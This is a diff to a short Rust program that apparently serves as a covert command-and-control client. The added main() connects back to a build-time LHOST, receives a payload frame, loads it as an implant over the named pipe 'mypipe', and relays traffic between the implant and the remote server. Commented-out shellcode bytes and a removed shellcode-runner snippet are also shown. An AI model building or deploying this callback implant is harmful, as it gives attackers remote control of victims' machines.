@@ -1,17 +1,16 @@
-// fn handle_upstream(sleep_time: u64) {
-//     loop {
-//         std::thread::sleep(std::time::Duration::from_secs(sleep_time));
-//         match TcpStream::connect("localhost:8080") {
-//             Ok(stream) => {
-//                 stream.read(buf)
-//             }
-//             Err(err) => {}
-//         }
-//     }
-// }
+use covert_client::CSFrame;
+use std::net::TcpStream;
 
-fn main() {
-    println!("hello client");
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let mut conn = TcpStream::connect(env!("LHOST","Set LHOST for client callback"))?;
+    let payload = conn.read_frame()?;
+    let mut implant = covert_client::create_implant_from_buf(payload, "mypipe")?;
+    loop {
+        let from_implant = implant.read_frame()?;
+        conn.write_frame(from_implant)?;
+        let from_upstream = conn.read_frame()?;
+        implant.write_frame(from_upstream)?;
+    }
 }
 
 // let shell_code: Vec<u8> = vec![
@@ -32,12 +31,3 @@ fn main() {
 //     0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1,
 //     0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
 // ];
-// let res = create_thread_from_buf(shell_code);
-// match res {
-//     Ok(_) => {
-//         println!("Success");
-//     }
-//     Err(val) => {
-//         println!("{:?}", val);
-//     }
-// }
